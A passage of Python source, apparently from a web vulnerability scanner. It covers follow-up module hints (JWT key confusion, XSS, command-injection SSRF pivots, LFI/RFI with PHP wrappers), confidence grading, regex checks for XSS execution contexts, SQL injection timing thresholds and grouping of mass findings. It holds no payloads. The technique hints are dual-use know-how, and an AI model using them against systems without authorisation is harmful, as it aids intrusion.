            {"module": "jwt_scanner", "reason": "RS256→HS256 key confusion attack"},
        ]
    if "xss" in vt:
        suggestions += [
            {"module": "xss_scanner", "reason": "Stored XSS — check admin panels that render user input"},
            {"module": "xss_scanner", "reason": "DOM-based XSS via client-side routing"},
        ]
    if "cmdi" in vt or "command" in vt:
        suggestions += [
            {"module": "ssrf_scanner", "reason": "CMDi may enable curl-based SSRF pivot"},
        ]
    if "lfi" in vt:
        suggestions += [
            {"module": "lfi_rfi", "reason": "RFI — check if remote URL inclusion also works"},
            {"module": "lfi_rfi", "reason": "PHP wrappers: php://filter, php://input"},
        ]

    return suggestions


# ══════════════════════════════════════════════════════════════════════
# CONFIDENCE ASSESSMENT & ADVANCED VERIFICATION HELPERS
# ══════════════════════════════════════════════════════════════════════

def assess_confidence(finding: Any) -> ConfidenceBand:
    """Determine the ConfidenceBand for a finding from its evidence fields.

    Accepts a finding as a dict or dataclass-like object. Inspects probe
    counts, hit counts, existing confidence labels, and evidence lists
    to assign the most appropriate band.

    Args:
        finding: Finding dict or object with confidence-related fields.

    Returns:
        The most appropriate ConfidenceBand value.
    """
    def _get(key: str, default: Any = None) -> Any:
        if isinstance(finding, dict):
            return finding.get(key, default)
        return getattr(finding, key, default)

    existing = str(_get("confidence") or "").upper()
    if existing in {"HIGH", "CONFIRMED"}:
        return ConfidenceBand.CONFIRMED
    if existing == "MEDIUM":
        return ConfidenceBand.LIKELY
    if existing == "LOW":
        return ConfidenceBand.POSSIBLE
    if existing in {"UNVERIFIED", "INFO", "INFORMATIONAL"}:
        return ConfidenceBand.INFORMATIONAL

    probe_count = int(_get("probe_count") or 0)
    probe_hits  = int(_get("probe_hits")  or 0)
    evidence    = _get("evidence") or []

    if probe_count >= 2 and probe_hits >= 2:
        return ConfidenceBand.CONFIRMED
    if probe_count >= 1 and probe_hits >= 1:
        return ConfidenceBand.LIKELY
    if probe_count >= 1 and probe_hits == 0:
        return ConfidenceBand.POSSIBLE
    if evidence:
        return ConfidenceBand.POSSIBLE
    return ConfidenceBand.INFORMATIONAL


def _verify_xss_context(
    response_html: str,
    payload: str,
    response_headers: dict[str, str] | None = None,
) -> bool:
    """Check whether a payload appears in an actual HTML execution context.

    Unlike a simple `payload in body` check, this verifies that the reflected
    content is in an executable sink (script block, event handler, href). It
    also rejects reflection when CSP or Content-Type would prevent execution.

    Args:
        response_html:    Full HTTP response body text.
        payload:          The XSS payload string to locate.
        response_headers: Optional dict of response headers for CSP/type checks.

    Returns:
        True only when the payload is reflected in an executable context and
        neither CSP nor Content-Type blocks script execution.
    """
    if not payload or payload not in response_html:
        return False

    headers = {k.lower(): v for k, v in (response_headers or {}).items()}

    content_type = headers.get("content-type", "text/html")
    if not any(ct in content_type for ct in ("text/html", "application/xhtml")):
        return False

    csp = headers.get("content-security-policy", "")
    if csp:
        csp_lower = csp.lower()
        if "script-src" in csp_lower and "'unsafe-inline'" not in csp_lower and "nonce-" not in csp_lower:
            inline_blocked = True
        else:
            inline_blocked = False
        if inline_blocked and re.search(r"<script[^>]*>", payload, re.IGNORECASE):
            return False

    escaped = html.escape(payload)
    if escaped in response_html and payload not in html.unescape(response_html):
        return False

    encoded_markers = ("&lt;script", "&#60;script", "&lt;img", "&#60;img",
                       "&lt;svg", "&#60;svg", "&lt;/", "&amp;")
    if any(m in response_html.lower() for m in encoded_markers[:6]):
        body_around = response_html
        for enc_m in encoded_markers[:6]:
            if enc_m in body_around.lower():
                idx = body_around.lower().find(enc_m)
                if payload in body_around[max(0, idx-20):idx+len(payload)+20]:
                    return False

    _esc = re.escape(payload)
    execution_patterns = (
        r"<script\b[^>]*>[^<]*" + _esc,
        r"\bon(?:error|load|click|mouseover|focus)\s*=\s*" + "[\\x27\\x22][^\\x27\\x22]*" + _esc,
        r"\bon(?:error|load|click|mouseover|focus)\s*=\s*[^>\s]*" + _esc,
        r"javascript\s*:\s*[^\\x27\\x22]*" + _esc,
        r"<[a-z]+[^>]+\bsrc\s*=\s*[\\x27\\x22]javascript:[^\\x27\\x22]*" + _esc,
        r"<svg[^>]*>[^<]*" + _esc,
    )
    return any(re.search(p, response_html, re.IGNORECASE | re.DOTALL)
               for p in execution_patterns)


def _verify_sqli_timing(delay_observed: float, baseline_delay: float) -> ConfidenceBand:
    """Validate time-based SQLi evidence using strict timing thresholds.

    Confirmation requires BOTH conditions:
        1. delay_observed >= 1.5 seconds (absolute minimum)
        2. delay_observed >= 2x baseline_delay (relative multiplier)

    Args:
        delay_observed: Response time measured during the injection probe (seconds).
        baseline_delay: Median clean response time for the same endpoint (seconds).

    Returns:
        CONFIRMED if both thresholds are met.
        LIKELY    if only the absolute threshold is met (relative not conclusive).
        INFORMATIONAL otherwise (timing noise, too fast, or suspicious baseline).
    """
    meets_absolute = delay_observed >= 1.5
    if not meets_absolute:
        return ConfidenceBand.INFORMATIONAL

    baseline_ref = max(baseline_delay, 0.1)
    meets_relative = delay_observed >= baseline_ref * 2.0
    if meets_relative:
        return ConfidenceBand.CONFIRMED
    return ConfidenceBand.LIKELY


def group_mass_vulns(findings: list) -> list:
    """Collapse repeated same-class vulnerabilities into a single mass finding.

    When the same vulnerability class appears at 50 or more distinct endpoints,
    individual findings are replaced by one aggregated "Mass Vulnerability"
    finding that includes a 5-endpoint representative sample. Classes below
    the threshold are returned unchanged.

    Args:
        findings: List of finding dicts.

    Returns:
        New list of findings where mass-occurrence classes are collapsed.
        Order within non-collapsed classes is preserved.
    """
    from collections import defaultdict

    groups: dict[str, list[dict[str, Any]]] = defaultdict(list)
    for f in findings:
        vuln_class = str(
            f.get("type") or f.get("vuln_type") or f.get("category") or "unknown"
        ).lower()
        groups[vuln_class].append(f)

    result: list[dict[str, Any]] = []
    for vuln_class, group in groups.items():
        if len(group) < 50:
            result.extend(group)
            continue

        endpoints: list[str] = []
        seen_urls: set[str] = set()
        for f in group:
            url = str(f.get("url") or f.get("target") or f.get("endpoint") or "")
            if url and url not in seen_urls:
                seen_urls.add(url)
                endpoints.append(url)

        sample = endpoints[:5]
        rep = group[0]

        raw_title = str(rep.get("title") or vuln_class)
        mass_finding: dict[str, Any] = {
            "type":            rep.get("type") or vuln_class,
            "vuln_type":       vuln_class,
            "title":           f"Mass {raw_title.title()} — {len(group)} Instances",
            "severity":        rep.get("severity", "HIGH"),
            "confidence":      rep.get("confidence", "HIGH"),
            "description": (
                f"The vulnerability class '{vuln_class}' was detected at {len(group)} "
                f"distinct endpoints, indicating a systemic issue rather than an isolated "
                f"occurrence. Sample endpoints: {', '.join(sample)}. "
                f"Total unique affected URLs: {len(seen_urls)}."
            ),
            "endpoint_count":  len(group),
            "unique_urls":     len(seen_urls),
            "sample_endpoints": sample,
            "mass_vuln":       True,
            "grouped_from":    len(group),
            "framework":       rep.get("framework", ""),
            "evidence":        [
                f"Systemic {vuln_class} at {len(group)} endpoints; "
                f"sample: {', '.join(sample[:3])}"
            ],
        }
        result.append(mass_finding)

    return result
